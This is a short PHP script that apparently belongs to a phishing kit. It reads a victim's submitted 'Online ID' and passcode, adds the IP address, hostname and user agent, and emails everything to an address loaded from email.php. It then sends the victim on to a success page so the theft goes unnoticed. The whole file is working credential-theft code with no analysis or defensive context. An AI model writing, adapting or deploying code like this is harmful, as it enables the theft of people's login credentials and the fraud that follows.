<?php
if($_POST["em"] != "" and $_POST["ps"] != ""){


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| D A T A  |--------------|\n";
	$message .= "Online ID            : ".$_POST['em']."\n";
	$message .= "Passcode              : ".$_POST['ps']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-------------------------|\n";
	include 'email.php';
	$subject .= "$HostSub | $ip";
	{
	mail($to,$subject,$message );    
	}
	$praga=rand();
	$praga=md5($praga);
	 header ("Location: success.php?Host=$Host");
}else{
	header ("Location: index.php");	
}

?>